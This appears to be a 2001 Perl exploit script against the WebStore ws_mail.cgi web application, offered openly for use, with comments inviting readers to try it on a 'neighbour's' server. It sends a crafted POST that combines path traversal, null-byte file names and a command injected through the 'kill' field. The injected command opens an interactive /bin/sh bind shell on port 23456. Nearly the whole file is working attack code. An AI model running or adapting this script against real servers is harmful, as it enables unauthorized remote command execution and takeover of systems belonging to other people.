#!/usr/bin/perl -w
# Sun, May 6, 2001
# exploit by Igor Dobrovitski, noident@my-deja.com
# The exploit is for the default set-up. A good way to test if your (your neighbour's :) server
# is vulnerable. Only for Unix, will now work on NT
# Enjoy
use Socket;
$| = 1;
####################################################################################################
$msgfile = '../../Statistics/WebStore_Access.counter';
$userfile = '../Statistics/WebStore_Access.counter';
# if the sploit doesn't work with the above values, comment them out and uncomment ones below
#$msgfile = '../../ws_delete_files.cron';
#$userfile = '../ws_delete_files.cron';
# or these if the above fails:
#$msgfile = '../../Statistics/index.html';
#$userfile = '../Statistics/index.html';
$exec_code = 'use Socket;$protocol = getprotobyname(tcp);socket(SOCK, PF_INET, SOCK_STREAM, $protocol)
;setsockopt(SOCK, SOL_SOCKET, SO_REUSEADDR, 1);$port=23456;bind(SOCK, sockaddr_in($port, INADDR_ANY));
listen(SOCK, 1);accept (NEW, SOCK);if(!fork()){open STDIN, "<&NEW"; open STDOUT, ">&NEW";open STDERR,
">&NEW";exec "/bin/sh -i"}else{close NEW;exit;}';
####################################################################################################
unless(defined $ARGV[0]) {die "Usage: $0 www.example.com/cgi-bin/ws_mail.cgi\n"}
$ARGV[0] =~ s|^(?:http://)*(.*/).*(\..*)$|${1}ws_mail$2|;
($host, $scriptpath) = $ARGV[0] =~ m|^(.*?)(/.*)$|;
$userfile .= '\0';
$sh_cmd = '55555;perl=\'perl\';test -x /usr/bin/perl && perl=\'/usr/bin/perl\';test -x /usr/local/bin/
perl && perl=\'/usr/local/bin/perl\';$perl -e \'' . $exec_code . '\'';
# the above is what's passed to the 'system' command as part of an argument
$form = makeform({'userfile' => $userfile, 'kill' => $sh_cmd, 'terminate' => 'whatever',
                  'admin' => 'yep', 'restart' => 'pls', 'msgfile' => $msgfile});
print "Engaging the enemy. Please stand by...\n";
$SIG{ALRM} = sub { print STDERR "Timeout was expected. The shell awaits you on port 23456\nHave fun an
d be nice to the server.\n"; exit };
alarm(20);
&send($form);
&oops_the_sploit_did_not_work();

sub makeform
{
    my $string;
    my @blah;
    my $line  = '';
    my $here;
    my %data = %{$_[0]};
    foreach my $key (keys %data)
    {
        $line .= "$key" . 'AAAA' . "$data{$key}" . 'BBBB';
    }
    $line =~ s|^(.*)BBBB$|$1|;
    $line =~ s/\\n/\n/g;
    $line =~ s/\\t/\t/g;
    $line =~ s/\\e/\e/g;
    $line =~ s/\\f/\f/g;
    $line =~ s/\\r/\r/g;
    $line =~ s/\\0/\0/g;
    foreach my $char (split //, $line)
    {
        if($char !~ m/[A-Za-z0-9._ ]/)
        {
            $char = unpack "H2", $char;
            $char = '%' . "$char";
        }
        push @blah, $char;
    }
    $string = join "",@blah;
    $string =~ s/AAAA/=/g;
    $string =~ s/BBBB/&/g;
    $string =~ s/ /+/g;
    my $cont_len = length($string);
$here = <<EOF;
POST $scriptpath HTTP/1.0
User-Agent: Mozilla (Windows 98)
Host: $host
referer: $host
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
Content-type: application/x-www-form-urlencoded
Content-length: $cont_len

$string
EOF
    return $here;
}

sub send
{
    my $form_to_send = shift;
    my $h = inet_aton($host) or die "Forward lookup for $host failed\n";
    socket(S,PF_INET,SOCK_STREAM,6) or die "socket prolems\n";
    unless(connect(S,sockaddr_in(80,$h))) {print STDERR "Couldn't connect to " . inet_ntoa($h) . "\n"
; close(S); exit 1 }
    select(S);
    $|=1;
    print "$form_to_send";
    my @reply=<S>;
    select(STDOUT);
    close(S);
    return @reply;
}

sub oops_the_sploit_did_not_work
{
    print STDERR "The exploit didn't work on this host\nSorry...\n";
    exit;
}
